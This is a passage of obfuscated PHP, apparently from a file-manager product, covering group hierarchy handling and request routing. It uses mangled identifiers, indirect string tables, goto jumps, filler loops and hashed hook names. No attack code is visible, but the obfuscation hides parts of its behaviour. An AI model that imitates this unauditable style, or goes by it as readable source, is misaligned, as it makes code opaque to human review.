$ÆõŠù§²) { $ÍËÕƒ³ = $this->getInfoSimple($ÆõŠù§²); $ß¿Ï©Íà = array($÷ü¦ş×–[593] => array($÷ü¦ş×–[459], $ÍËÕƒ³[$÷ü¦ş×–[593]] . $ÆõŠù§² . $÷ü¦ş×–[622])); $íÒâŠ‹ë = $this->field($÷ü¦ş×–[1969])->where($ß¿Ï©Íà)->select(); $’éèªÑ… = array_merge($’éèªÑ…, array_to_keyvalue($íÒâŠ‹ë, $÷ü¦ş×–[12], $÷ü¦ş×–[1969])); } return array_unique($’éèªÑ…); } private function _searchFromMeta($ú¶Òì­Ú, $¯ÈÖ¶­Ù, $á™Åİ’§, $ÍĞô‘Ü) { $ÆÎŸíîş =& $_SERVER[ç¦¬”œš]; $¯ÈÖ¶­Ù = strtolower($¯ÈÖ¶­Ù); $‚ÌÍœÊ = array($ÆÎŸíîş[97] => $ú¶Òì­Ú, $ÆÎŸíîş[450] => array($ÆÎŸíîş[459], "\45{$¯ÈÖ¶­Ù}\x25")); $‚ÌÍœÊ = $this->parseWhereLike($‚ÌÍœÊ); if ($ÍĞô‘Ü) { $‚ÌÍœÊ[$ÆÎŸíîş[1969]] = array($ÆÎŸíîş[7], $ÍĞô‘Ü); } $Æğ‚•–Ó = Model($ÆÎŸíîş[2072])->where($‚ÌÍœÊ)->limit($á™Åİ’§)->select(); if (!$Æğ‚•–Ó) { return array(); } $Æğ‚•–Ó = array_to_keyvalue($Æğ‚•–Ó, $ÆÎŸíîş[12], $ÆÎŸíîş[1969]); $ÒÄ§“’„ = $this->where(array($ÆÎŸíîş[2061] => array($ÆÎŸíîş[7], $Æğ‚•–Ó)))->select(); if (!$ÒÄ§“’„) { return array(); } return $ÒÄ§“’„; } protected function _listDataApplyItem($òÇ‡ÎÅ¥) { $ë†É“ó— = array($òÇ‡ÎÅ¥); $this->_listDataApply($ë†É“ó—); return $ë†É“ó—[0]; } protected function _listDataApply(&$ø›àËÒ) { $„ú¡İ‘ê =& $_SERVER[ç¦¬”œš]; if (!$ø›àËÒ) { return; } $µû½Î²û = array_to_keyvalue($ø›àËÒ, $„ú¡İ‘ê[12], $„ú¡İ‘ê[1969]); $this->_listAppendChildren($ø›àËÒ); $this->_listAppendChildrenMember($ø›àËÒ); $this->_listAppendMeta($ø›àËÒ, $µû½Î²û); $this->_listAppendParent($ø›àËÒ); $this->_listAppendSourceRoot($ø›àËÒ, $µû½Î²û); } private function _listAppendChildren(&$ßşâ›©Ñ) { $˜ñ¦ôíÓ =& $_SERVER[ç¦¬”œš]; $˜Òó‹ÄÊ = array_to_keyvalue($ßşâ›©Ñ, $˜ñ¦ôíÓ[12], $˜ñ¦ôíÓ[1969]); $°ú¢ÈÛ = array($˜ñ¦ôíÓ[192] => array($˜ñ¦ôíÓ[7], $˜Òó‹ÄÊ)); $ƒÌß„Õ¯ = array($˜ñ¦ôíÓ[192], $˜ñ¦ôíÓ[2073] => $˜ñ¦ôíÓ[574]); $ŸÔÈÜŒÊ = $this->field($ƒÌß„Õ¯)->where($°ú¢ÈÛ)->group($˜ñ¦ôíÓ[192])->select(); $ó×ëï–â = array_to_keyvalue($ŸÔÈÜŒÊ, $˜ñ¦ôíÓ[192], $˜ñ¦ôíÓ[574]); foreach ($ßşâ›©Ñ as &$îĞ¼¯«) { $¦íé›Â = $îĞ¼¯«[$˜ñ¦ôíÓ[1969]]; $îĞ¼¯«[$˜ñ¦ôíÓ[2074]] = isset($ó×ëï–â[$¦íé›Â]) ? intval($ó×ëï–â[$¦íé›Â]) : !1; } unset($îĞ¼¯«); } private function _listAppendChildrenMember(&$§Ñãìù) { $à‚¿¯Ë =& $_SERVER[ç¦¬”œš]; $òÑ›èí = array_to_keyvalue($§Ñãìù, $à‚¿¯Ë[12], $à‚¿¯Ë[1969]); $óñÅĞõ‡ = array($à‚¿¯Ë[1969] => array($à‚¿¯Ë[7], $òÑ›èí)); $ë†¸›Õ» = array($à‚¿¯Ë[1969], $à‚¿¯Ë[2073] => $à‚¿¯Ë[574]); $úá¿Ñ²Ê = Model($à‚¿¯Ë[2063])->field($ë†¸›Õ»)->where($óñÅĞõ‡)->group($à‚¿¯Ë[1969])->select(); $ÇÜì´¯» = array_to_keyvalue($úá¿Ñ²Ê, $à‚¿¯Ë[1969], $à‚¿¯Ë[574]); foreach ($§Ñãìù as &$ÜÖâ›¥) { $éôª·ã = $ÜÖâ›¥[$à‚¿¯Ë[1969]]; $ÜÖâ›¥[$à‚¿¯Ë[2075]] = isset($ÇÜì´¯»[$éôª·ã]) ? intval($ÇÜì´¯»[$éôª·ã]) : !1; } unset($ÜÖâ›¥); } private function _listAppendMeta(&$×î¨Œâ¢, $¶ÒğÎ¨) { $µ¬™é¤Ñ =& $_SERVER[ç¦¬”œš]; $ì®¶Ã®¾ = array($µ¬™é¤Ñ[1969] => array($µ¬™é¤Ñ[7], $¶ÒğÎ¨)); $„±Ûß¤â = Model($µ¬™é¤Ñ[2062])->where($ì®¶Ã®¾)->select(); $„±Ûß¤â = array_to_keyvalue_group($„±Ûß¤â, $µ¬™é¤Ñ[1969]); foreach ($„±Ûß¤â as &$÷†×çÏ) { $÷†×çÏ = array_to_keyvalue($÷†×çÏ, $µ¬™é¤Ñ[97], $µ¬™é¤Ñ[450]); } unset($÷†×çÏ); foreach ($×î¨Œâ¢ as &$’®¼ôô») { $’®¼ôô»[$µ¬™é¤Ñ[548]] = array(); if (isset($„±Ûß¤â[$’®¼ôô»[$µ¬™é¤Ñ[1969]]])) { $’®¼ôô»[$µ¬™é¤Ñ[548]] = $„±Ûß¤â[$’®¼ôô»[$µ¬™é¤Ñ[1969]]]; } } unset($’®¼ôô»); } protected function parentLevelArray($Ş¾ğëí÷) { $´ğ‹Âª‘ =& $_SERVER[ç¦¬”œš]; $Ş¾ğëí÷ = explode($´ğ‹Âª‘[50], trim($Ş¾ğëí÷, $´ğ‹Âª‘[50])); $Ş¾ğëí÷ = array_remove_value($Ş¾ğëí÷, $´ğ‹Âª‘[228]); return $Ş¾ğëí÷; } protected function parentInGroup($ûÛ½ÑÖ, $ã¦¢àÛ¢) { $Şú…í– =& $_SERVER[ç¦¬”œš]; $¸– ¼¦ = $this->getInfoSimple($ûÛ½ÑÖ); if (!$¸– ¼¦) { return !0; } $ÛìÚ²ùš = $this->parentLevelArray($¸– ¼¦[$Şú…í–[593]]); $ÛìÚ²ùš[] = $ûÛ½ÑÖ; foreach ($ÛìÚ²ùš as $ûÛ½ÑÖ) { if (in_array($ûÛ½ÑÖ . $Şú…í–[12], $ã¦¢àÛ¢)) { return !0; } } return !1; } private function _listAppendParent(&$İÀĞÛ”Ô) { $½ÄÀğ =& $_SERVER[ç¦¬”œš]; $øŞ¹¥îù = array(); foreach ($İÀĞÛ”Ô as &$üï£¤Ç¨) { $øŞ¹¥îù[$üï£¤Ç¨[$½ÄÀğ[1969]]] = $üï£¤Ç¨[$½ÄÀğ[32]]; $ØÑ°ñÙ = $this->parentLevelArray($üï£¤Ç¨[$½ÄÀğ[593]]); foreach ($ØÑ°ñÙ as $Ğ„µªç) { if (!isset($øŞ¹¥îù[$Ğ„µªç])) { $øŞ¹¥îù[$Ğ„µªç] = 0; } } } unset($üï£¤Ç¨); foreach ($øŞ¹¥îù as $§¢˜Å ˆ => $í®²Å“Ó) { if ($í®²Å“Ó) { continue; } $Ô”••ªÇ = $this->getInfoSimple($§¢˜Å ˆ); $øŞ¹¥îù[$§¢˜Å ˆ] = $Ô”••ªÇ[$½ÄÀğ[32]]; } $è÷°… = $GLOBALS[$½ÄÀğ[6]][$½ÄÀğ[92]][$½ÄÀğ[2076]]; if (KodUser::isRoot()) { $è÷°… = !1; } foreach ($İÀĞÛ”Ô as &$üï£¤Ç¨) { $ØÑ°ñÙ = $this->parentLevelArray($üï£¤Ç¨[$½ÄÀğ[593]]); $¤‘äÌéÀ = $½ÄÀğ[12]; foreach ($ØÑ°ñÙ as $§¢˜Å ˆ => $Ğ„µªç) { if ($è÷°… && $§¢˜Å ˆ == 0) { continue; } $¤‘äÌéÀ .= $øŞ¹¥îù[$Ğ„µªç] . $½ÄÀğ[8]; } if ($ØÑ°ñÙ) { $¤‘äÌéÀ .= $üï£¤Ç¨[$½ÄÀğ[32]]; } $üï£¤Ç¨[$½ÄÀğ[598]] = str_replace($½ÄÀğ[601], $½ÄÀğ[8], $¤‘äÌéÀ); } unset($üï£¤Ç¨); } private function _listAppendSourceRoot(&$Ş€‚µç, $Á Ğ÷‹í) { $‚‚Ÿİ¿ı =& $_SERVER[ç¦¬”œš]; $è ¬®É¡ = Model($‚‚Ÿİ¿ı[904])->listSourceRoot(SourceModel::TYPE_GROUP, $Á Ğ÷‹í); $è ¬®É¡ = array_to_keyvalue($è ¬®É¡, $‚‚Ÿİ¿ı[578]); $è ¬®É¡ = array_remove_key($è ¬®É¡, $‚‚Ÿİ¿ı[578]); foreach ($Ş€‚µç as &$Ş¨±Å­û) { $Ş¨±Å­û[$‚‚Ÿİ¿ı[90]] = $è ¬®É¡[$Ş¨±Å­û[$‚‚Ÿİ¿ı[1969]]] ? $è ¬®É¡[$Ş¨±Å­û[$‚‚Ÿİ¿ı[1969]]] : array(); } unset($Ş¨±Å­û); } protected function groupMerge($³£ãî¶) { $³£ãî¶ = array_values(array_unique($³£ãî¶)); $ÀÎøş÷‘ = array(); for ($¿ø¿€ÆÑ = 0; $¿ø¿€ÆÑ < count($³£ãî¶); $¿ø¿€ÆÑ++) { $ë—ƒİ­ü = !1; for ($‘Ó¬ÚÚ‹ = 0; $‘Ó¬ÚÚ‹ < count($³£ãî¶); $‘Ó¬ÚÚ‹++) { if ($¿ø¿€ÆÑ == $‘Ó¬ÚÚ‹) { continue; } if ($this->isParentOf($³£ãî¶[$‘Ó¬ÚÚ‹], $³£ãî¶[$¿ø¿€ÆÑ])) { $ë—ƒİ­ü = !0; break; } } if (!$ë—ƒİ­ü) { $ÀÎøş÷‘[] = $³£ãî¶[$¿ø¿€ÆÑ]; } } return $ÀÎøş÷‘; } protected function isParentOf($Í®Š÷¬Ç, $ßæÍµ›ˆ) { $Æ«¢¹£Ã =& $_SERVER[ç¦¬”œš]; if (!$Í®Š÷¬Ç || !$ßæÍµ›ˆ || $Í®Š÷¬Ç == $ßæÍµ›ˆ) { return !1; } $Êµ†êœ¿ = $this->getInfoSimple($Í®Š÷¬Ç); $‹¢ëæ÷ = $this->getInfoSimple($ßæÍµ›ˆ); $ö”ß™É½ = $Êµ†êœ¿[$Æ«¢¹£Ã[593]] . $Í®Š÷¬Ç . $Æ«¢¹£Ã[50]; if (substr($‹¢ëæ÷[$Æ«¢¹£Ã[593]], 0, strlen($ö”ß™É½)) == $ö”ß™É½) { return !0; } return !1; } public function groupShowRoot($¶§Ñ¿Õ•, $ÜÅ…§“† = false) { $ìÀÙä =& $_SERVER[ç¦¬”œš]; $Å‘µä‹â = $this->getInfo($¶§Ñ¿Õ•); if (!$Å‘µä‹â) { return array(); } $ƒéü»Š¡ = $this->parentLevelArray($Å‘µä‹â[$ìÀÙä[593]]); $”†µŒøÁ = array($¶§Ñ¿Õ•); if (count($ƒéü»Š¡) == 0) { return $”†µŒøÁ; } if ($ÜÅ…§“† && count($ƒéü»Š¡) == 1) { return $”†µŒøÁ; } if (!$Å‘µä‹â[$ìÀÙä[548]] || !isset($Å‘µä‹â[$ìÀÙä[548]][$ìÀÙä[2059]]) || $Å‘µä‹â[$ìÀÙä[548]][$ìÀÙä[2059]] == $ìÀÙä[856]) { return $this->groupShowRoot($ƒéü»Š¡[count($ƒéü»Š¡) - 1], $ÜÅ…§“†); } if ($Å‘µä‹â[$ìÀÙä[548]][$ìÀÙä[2059]] == $ìÀÙä[433]) { $úÖ½ÂÈ§ = explode($ìÀÙä[50], $Å‘µä‹â[$ìÀÙä[548]][$ìÀÙä[2060]]); if ($úÖ½ÂÈ§) { $”†µŒøÁ = array_merge($”†µŒøÁ, $úÖ½ÂÈ§); } } return $”†µŒøÁ; } protected function resetParentLevel() { $üí§Â =& $_SERVER[ç¦¬”œš]; $İı„‚Ô± = $üí§Â[1969]; $Å—Úü«© = $this->select(); $Å—Úü«© = array_to_keyvalue($Å—Úü«©, $İı„‚Ô±); foreach ($Å—Úü«© as $ŞÎ•£ºµ) { $ ¾ªƒ¤Á = $ŞÎ•£ºµ; $¡ö‹í¾ = array(); while ($ ¾ªƒ¤Á[$üí§Â[192]] != 0) { $¡ö‹í¾[] = $ ¾ªƒ¤Á[$üí§Â[192]]; $ ¾ªƒ¤Á = $Å—Úü«©[$ ¾ªƒ¤Á[$üí§Â[192]]]; } $¡ö‹í¾[] = 0; $¡ö‹í¾ = $üí§Â[50] . implode($üí§Â[50], array_reverse($¡ö‹í¾)) . $üí§Â[50]; $this->setNamePinyin($ŞÎ•£ºµ[$İı„‚Ô±], $ŞÎ•£ºµ[$üí§Â[32]]); $this->where(array($İı„‚Ô± => $ŞÎ•£ºµ[$İı„‚Ô±]))->save(array($üí§Â[661] => $¡ö‹í¾)); } return $Å—Úü«©; } public function groupNameAuto($¸¤…ï, $ğ©ÒÛÏ) { $«ˆçÖ¢” =& $_SERVER[ç¦¬”œš]; $¶œÅä®€ = $this->where(array($«ˆçÖ¢”[486] => $¸¤…ï))->getField($«ˆçÖ¢”[32], !0); if (!$¶œÅä®€ || !in_array($ğ©ÒÛÏ, $¶œÅä®€)) { return $ğ©ÒÛÏ; } for ($¹·ôß˜‡ = 1; $¹·ôß˜‡ <= count($¶œÅä®€) + 1; $¹·ôß˜‡++) { $©ıÈÆå¸ = $ğ©ÒÛÏ . "\x28{$¹·ôß˜‡}\51"; if (!in_array($©ıÈÆå¸, $¶œÅä®€)) { return $©ıÈÆå¸; } } } public function groupSwitch($ŒòññÉü, $ÉÙ’ÈŸ—) { $ŒùæÃî =& $_SERVER[ç¦¬”œš]; $Éü £Ì = array($ŒùæÃî[1969] => array($ŒùæÃî[7], array($ŒòññÉü, $ÉÙ’ÈŸ—))); $à­Ğİïñ = $this->where($Éü £Ì)->select(); $à­Ğİïñ = array_to_keyvalue($à­Ğİïñ, $ŒùæÃî[1969]); if (!isset($à­Ğİïñ[$ŒòññÉü]) || !isset($à­Ğİïñ[$ÉÙ’ÈŸ—]) || $à­Ğİïñ[$ŒòññÉü][$ŒùæÃî[192]] == 0) { return !1; } $Éü £Ì = array($ŒùæÃî[1969] => $ŒòññÉü); $É˜—ûŸ­ = Model($ŒùæÃî[2063])->where($Éü £Ì)->select(); if (!$É˜—ûŸ­) { $É˜—ûŸ­ = array(); } foreach ($É˜—ûŸ­ as $è¸Ã¨‡Û) { $ÅÜé³Ş = $è¸Ã¨‡Û[$ŒùæÃî[1770]]; $Éü £Ì = array($ŒùæÃî[1770] => $ÅÜé³Ş, $ŒùæÃî[1969] => $ÉÙ’ÈŸ—); $Ñ—¾ïÇÎ = Model($ŒùæÃî[2063])->where($Éü £Ì)->find(); if (!$Ñ—¾ïÇÎ) { $ğ¹µ¤Ãº = array($ÉÙ’ÈŸ— => $è¸Ã¨‡Û[$ŒùæÃî[2077]]); Model($ŒùæÃî[607])->userGroupAdd($ÅÜé³Ş, $ğ¹µ¤Ãº); } Model($ŒùæÃî[607])->userGroupRemove($ÅÜé³Ş, $ŒòññÉü); } $Éü £Ì = array($ŒùæÃî[190] => 2, $ŒùæÃî[192] => 0, $ŒùæÃî[494] => 1, $ŒùæÃî[578] => array($ŒùæÃî[7], array($ŒòññÉü, $ÉÙ’ÈŸ—))); $Ê©§åòÑ = Model($ŒùæÃî[904])->where($Éü £Ì)->field($ŒùæÃî[2078])->select(); $Ê©§åòÑ = array_to_keyvalue($Ê©§åòÑ, $ŒùæÃî[578], $ŒùæÃî[193]); $ÚÊüöæÙ = !empty($Ê©§åòÑ[$ŒòññÉü]) ? $Ê©§åòÑ[$ŒòññÉü] : !1; if ($ÚÊüöæÙ) { if (!$Ê©§åòÑ[$ÉÙ’ÈŸ—]) { $Ê©§åòÑ[$ÉÙ’ÈŸ—] = Model($ŒùæÃî[904])->groupRootAdd($ÉÙ’ÈŸ—); } $ñåÈ¾œ = $Ê©§åòÑ[$ÉÙ’ÈŸ—]; $Éü £Ì = array($ŒùæÃî[192] => $ÚÊüöæÙ); $Ê©§åòÑ = Model($ŒùæÃî[904])->where($Éü £Ì)->field($ŒùæÃî[2079])->select(); if (!$Ê©§åòÑ) { $Ê©§åòÑ = array(); } Model($ŒùæÃî[904])->moveClearAuth = !1; foreach ($Ê©§åòÑ as $ô—èç) { $¬Œ¥°§– = $ô—èç[$ŒùæÃî[494]] == $ŒùæÃî[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ŒùæÃî[904])->move($ô—èç[$ŒùæÃî[193]], $ñåÈ¾œ, $¬Œ¥°§–); } Model($ŒùæÃî[904])->moveClearAuth = !0; $Éü £Ì = array($ŒùæÃî[190] => 2, $ŒùæÃî[578] => $ŒòññÉü); $ÖÉÜã“ä = array($ŒùæÃî[578] => $ÉÙ’ÈŸ—); Model($ŒùæÃî[2080])->where($Éü £Ì)->save($ÖÉÜã“ä); Model($ŒùæÃî[2081])->where($Éü £Ì)->save($ÖÉÜã“ä); } $this->_changeChildLevel($à­Ğİïñ[$ŒòññÉü], $à­Ğİïñ[$ÉÙ’ÈŸ—], !0); $this->where(array($ŒùæÃî[192] => $ŒòññÉü))->save(array($ŒùæÃî[192] => $ÉÙ’ÈŸ—)); $this->_clearChildrenCache($à­Ğİïñ[$ÉÙ’ÈŸ—]); return !0; } } goto Fñ³Ôñä¦ò; E·«¢†×ä: if (!$brkazhtipl) { die; } class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\156\x64\145\x78"; function __construct() { } public function setDefault($†…ó¨×³) { $ü”›—Ä÷ =& $_SERVER[ç¦¬”œš]; $¡â°ÉÔè =& $_SERVER[ß±¢Œ¿–]; $•’…»ÕÏ = explode($¡â°ÉÔè[0], trim($†…ó¨×³, $¡â°ÉÔè[0])); $this->defaultModule = $•’…»ÕÏ[0] ? $•’…»ÕÏ[0] : $this->defaultModule; $ÎÂåÃ¬Æ = $ü”›—Ä÷[692]; if (strlen($ÎÂåÃ¬Æ) < $ü”›—Ä÷[478]) { return; } $this->defaultController = $•’…»ÕÏ[1] ? $•’…»ÕÏ[1] : $this->defaultController; $©ù‰¿¿Ö = $ü”›—Ä÷[693]; $this->defaultAction = $•’…»ÕÏ[2] ? $•’…»ÕÏ[2] : $this->defaultAction; $this->kugv6683bd9b($¡â°ÉÔè[1], array($this, $¡â°ÉÔè[2])); $½ÊÙ¹İŒ = $ü”›—Ä÷[694]; } public function appRun($õËÙí‹ü) { $ä‘È¾Î÷ =& $_SERVER[ç¦¬”œš]; $š†¨Ï„ï =& $_SERVER[ß±¢Œ¿–]; $ß¤Ä¾‹é = explode($š†¨Ï„ï[0], $õËÙí‹ü); $ï²åµßú = strtolower($ß¤Ä¾‹é[0]); $­¯Ğ™êë = $ä‘È¾Î÷[695]; if (!$­¯Ğ™êë) { return; } $ıâ¿Ì“ = $š†¨Ï„ï[3]; if ($ï²åµßú == $š†¨Ï„ï[4]) { $ıâ¿Ì“ = $š†¨Ï„ï[5]; $ß¤Ä¾‹é[0] = $š†¨Ï„ï[6]; $ß¤Ä¾‹é[1] = $ß¤Ä¾‹é[1] . $š†¨Ï„ï[7]; $õËÙí‹ü = join($š†¨Ï„ï[0], $ß¤Ä¾‹é); $õËÙí‹ü = trim($õËÙí‹ü, $š†¨Ï„ï[0]); } call_user_func(array($š†¨Ï„ï[8], $š†¨Ï„ï[9]), $ıâ¿Ì“ . $š†¨Ï„ï[10], $õËÙí‹ü); ActionCall($õËÙí‹ü); $Óı¼ÑÇ‘ = $ä‘È¾Î÷[696]; call_user_func(array($š†¨Ï„ï[8], $š†¨Ï„ï[9]), $ıâ¿Ì“ . $š†¨Ï„ï[11], $õËÙí‹ü); } private function autorun() { $šª¸Ä«ô =& $_SERVER[ß±¢Œ¿–]; global $config; if (count($config[$šª¸Ä«ô[12]]) == 0) { return; } foreach ($config[$šª¸Ä«ô[12]] as $‚¢µƒÔŠ => $’êáØ•Î) { $this->appRun($’êáØ•Î); $Ô´±ÙÄ´ = $_SERVER[ç¦¬”œš][697]; if (!$Ô´±ÙÄ´) { die; } } } private function icuj9f45a222() { $µéÔÕ°ı =& $_SERVER[ç¦¬”œš]; $Ó•‹Á«é =& $_SERVER[ß±¢Œ¿–]; $åº•´ÆÊ = $Ó•‹Á«é[4]; $ô„åšô‰ = $µéÔÕ°ı[698]; while (strlen($ô„åšô‰) < $µéÔÕ°ı[478]) { if (!$ô„åšô‰) { break; } $ô„åšô‰++; } $ä³õ­Ã¦ = $GLOBALS[$Ó•‹Á«é[13]][$Ó•‹Á«é[14]][0]; if (!$ä³õ­Ã¦ || strlen($ä³õ­Ã¦) <= strlen($åº•´ÆÊ)) { return; } if (strtolower(substr($ä³õ­Ã¦, -strlen($åº•´ÆÊ))) != $åº•´ÆÊ) { return; } $â€Ûóô½ = substr($ä³õ­Ã¦, 0, -strlen($åº•´ÆÊ)); $©ÏÂ«¾ = $µéÔÕ°ı[699]; $»¿³â = array($Ó•‹Á«é[4], $â€Ûóô½); $å¿„š´¹ = $µéÔÕ°ı[700]; while ($å¿„š´¹ < $µéÔÕ°ı[701]) { if ($å¿„š´¹ >= 0) { break; } $å¿„š´¹++; } $ûèœÙ—æ = array_slice($GLOBALS[$Ó•‹Á«é[13]][$Ó•‹Á«é[14]], 1); $×ñÉó´ = $µéÔÕ°ı[702]; $GLOBALS[$Ó•‹Á«é[13]][$Ó•‹Á«é[14]] = array_merge($»¿³â, $ûèœÙ—æ); $óË›™ = $µéÔÕ°ı[703]; if (!$óË›™) { return; } $GLOBALS[$Ó•‹Á«é[13]][$Ó•‹Á«é[15]] = implode($Ó•‹Á«é[0], $GLOBALS[$Ó•‹Á«é[13]][$Ó•‹Á«é[14]]); } private function vaqi90ba427d() { $©—×»§Ÿ =& $_SERVER[ç¦¬”œš]; $´„ÀÆÂ– =& $_SERVER[ß±¢Œ¿–]; if ($GLOBALS[$´„ÀÆÂ–[13]][$´„ÀÆÂ–[15]] != $´„ÀÆÂ–[6]) { return; } $°Š¥Ş¹Ğ = $_SERVER[$´„ÀÆÂ–[16]]; $™Š€Ê‘ã = $´„ÀÆÂ–[17]; if (!strstr($°Š¥Ş¹Ğ, $™Š€Ê‘ã)) { return; } $ÛÇÓ®òÇ = strrpos($°Š¥Ş¹Ğ, $™Š€Ê‘ã); $ŞÎšâÙÚ = substr($°Š¥Ş¹Ğ, $ÛÇÓ®òÇ + strlen($™Š€Ê‘ã)); $Ï®çè¶ = $©—×»§Ÿ[704]; while (strlen($Ï®çè¶) < $©—×»§Ÿ[705]) { if (!$Ï®çè¶) { break; } $Ï®çè¶++; } preg_match_all($´„ÀÆÂ–[18], $ŞÎšâÙÚ, $ò÷å…³‘); $ğì“úşû = $©—×»§Ÿ[706]; if (strlen($ğì“úşû) < $©—×»§Ÿ[707]) { die; } $ŞÎšâÙÚ = trim($ò÷å…³‘[0][0], $´„ÀÆÂ–[19]); $GLOBALS[$´„ÀÆÂ–[13]][$´„ÀÆÂ–[14]] = explode($´„ÀÆÂ–[19], $ŞÎšâÙÚ); $GLOBALS[$´„ÀÆÂ–[13]][$´„ÀÆÂ–[15]] = implode($´„ÀÆÂ–[0], $GLOBALS[$´„ÀÆÂ–[13]][$´„ÀÆÂ–[14]]); $È†›¹ü = $©—×»§Ÿ[708]; } public function run() { $ñá «¾ =& $_SERVER[ç¦¬”œš]; $²Ç–‰š =& $_SERVER[ß±¢Œ¿–]; $this->vaqi90ba427d(); $µÏ·ûÆÕ = $ñá «¾[709]; if (!$µÏ·ûÆÕ) { die; } $this->icuj9f45a222(); $Ì¬ ¶¹ = $GLOBALS[$²Ç–‰š[13]][$²Ç–‰š[14]]; $Ä‹¥·Şã = $ñá «¾[710]; $ÚÔîß¦ = $GLOBALS[$²Ç–‰š[13]][$²Ç–‰š[15]]; $­£— = $ñá «¾[711]; if (!$­£—) { return; } define($²Ç–‰š[20], isset($Ì¬ ¶¹[0]) && $Ì¬ ¶¹[0] ? $Ì¬ ¶¹[0] : $this->defaultModule); define($²Ç–‰š[21], isset($Ì¬ ¶¹[1]) && $Ì¬ ¶¹[0] ? $Ì¬ ¶¹[1] : $this->defaultController); $·‰«øŒ = $ñá «¾[712]; while ($·‰«øŒ < $ñá «¾[705]) { if ($·‰«øŒ >= 0) { break; } $·‰«øŒ++; } define($²Ç–‰š[22], isset($Ì¬ ¶¹[2]) && $Ì¬ ¶¹[0] ? $Ì¬ ¶¹[2] : $this->defaultAction); $Á£ˆ†‹ = $ñá «¾[713]; define($²Ç–‰š[23], MOD . $²Ç–‰š[0] . ST . $²Ç–‰š[0] . ACT); $ù‘€ôˆ° = $ñá «¾[714]; while (strlen($ù‘€ôˆ°) < $ñá «¾[707]) { if (!$ù‘€ôˆ°) { break; } $ù‘€ôˆ°++; } $_SERVER[$²Ç–‰š[24]] = strtolower(ACTION); $ãıÅ±· = $ñá «¾[715]; while ($ãıÅ±· < $ñá «¾[707]) { if ($ãıÅ±· >= 0) { break; } $ãıÅ±·++; } $this->autorun(); if (count($Ì¬ ¶¹) >= 3) { $this->appRun($ÚÔîß¦); } else { $this->appRun(ACTION); } } private $gpbr66657c07 = array(); private $uodr6330571a = ''; public function tild8dd59547() { $êã„‚˜¨ =& $_SERVER[ç¦¬”œš]; $‘¡®°£ =& $_SERVER[ß±¢Œ¿–]; $this->xtvn49b750ea(); $this->eign0215e716(); $this->rntk7f98c299(); $²œ¹ù« = $êã„‚˜¨[716]; $this->czmla7d0a967(); $Ï¢ê¶Ä = $êã„‚˜¨[717]; while (strlen($Ï¢ê¶Ä) < $êã„‚˜¨[701]) { if (!$Ï¢ê¶Ä) { break; } $Ï¢ê¶Ä++; } $this->wliha206745d(); $µßÈàö = $êã„‚˜¨[718]; $this->vrfg5487990f(); $õŠƒæî› = $êã„‚˜¨[719]; $this->zevk7ea15609(); $this->kugv6683bd9b($‘¡®°£[25], array($this, $‘¡®°£[26])); $ÔÙŒêåˆ = $êã„‚˜¨[720]; if (strlen($ÔÙŒêåˆ) < $êã„‚˜¨[705]) { die; } $this->kugv6683bd9b($‘¡®°£[27], array($this, $‘¡®°£[28])); $¸¹¯”ñ = $êã„‚˜¨[721]; while (strlen($¸¹¯”ñ) < $êã„‚˜¨[701]) { if (!$¸¹¯”ñ) { break; } $¸¹¯”ñ++; } $this->kugv6683bd9b($‘¡®°£[29], array($this, $‘¡®°£[30])); $this->kugv6683bd9b($‘¡®°£[31], array($this, $‘¡®°£[32])); } public function whpy2da662cb($×ğ®¨õ) { $¨·¼ ôÀ =& $_SERVER[ç¦¬”œš]; $Ôõ³û® =& $_SERVER[ß±¢Œ¿–]; $Ã‡ÁÚÂ§ = Model($Ôõ³û®[33])->get(); $ŸÔ…Ì‡ = array($Ôõ³û®[34], $Ôõ³û®[35], $Ôõ³û®[36], $Ôõ³û®[37], $Ôõ³û®[38], $Ôõ³û®[39], $Ôõ³û®[40], $Ôõ³û®[41], $Ôõ³û®[42], $Ôõ³û®[43], $Ôõ³û®[44], $Ôõ³û®[45], $Ôõ³û®[46], $Ôõ³û®[47], $Ôõ³û®[48], $Ôõ³û®[49], $Ôõ³û®[50], $Ôõ³û®[51], $Ôõ³û®[52], $Ôõ³û®[53], $Ôõ³û®[54], $Ôõ³û®[55], $Ôõ³û®[56], $Ôõ³û®[57], $Ôõ³û®[58], $Ôõ³û®[59], $Ôõ³û®[60], $Ôõ³û®[61], $Ôõ³û®[62], $Ôõ³û®[63], $Ôõ³û®[64], $Ôõ³û®[65], $Ôõ³û®[66], $Ôõ³û®[67], $Ôõ³û®[68], $Ôõ³û®[69], $Ôõ³û®[70], $Ôõ³û®[71], $Ôõ³û®[72], $Ôõ³û®[73], $Ôõ³û®[74], $Ôõ³û®[75], $Ôõ³û®[76], $Ôõ³û®[77], $Ôõ³û®[78], $Ôõ³û®[79], $Ôõ³û®[80], $Ôõ³û®[81], $Ôõ³û®[82], $Ôõ³û®[83], $Ôõ³û®[84], $Ôõ³û®[85]); $¡Ëô—Ñ = $¨·¼ ôÀ[722]; while ($¡Ëô—Ñ < $¨·¼ ôÀ[701]) { if ($¡Ëô—Ñ >= 0) { break; } $¡Ëô—Ñ++; } foreach ($ŸÔ…Ì‡ as $¯ÔÖºÜú) { $›ÖéÈ³› = $GLOBALS[$Ôõ³û®[86]][$Ôõ³û®[87]][$¯ÔÖºÜú]; $Ó¢ªéÕ = $¨·¼ ôÀ[723]; if (strlen($Ó¢ªéÕ) < $¨·¼ ôÀ[478]) { die; } if (isset($Ã‡ÁÚÂ§[$¯ÔÖºÜú])) { $›ÖéÈ³› = $Ã‡ÁÚÂ§[$¯ÔÖºÜú]; } $×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$¯ÔÖºÜú] = $›ÖéÈ³›; } $öèÛ¥…¸ = $×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$Ôõ³û®[46]]; unset($×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[90]][$Ôõ³û®[91]]); $’â š¼Å = $¨·¼ ôÀ[724]; unset($×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[90]][$Ôõ³û®[92]]); $úã‚¹â¹ = $¨·¼ ôÀ[725]; unset($×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$Ôõ³û®[46]]); unset($×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$Ôõ³û®[93]]); 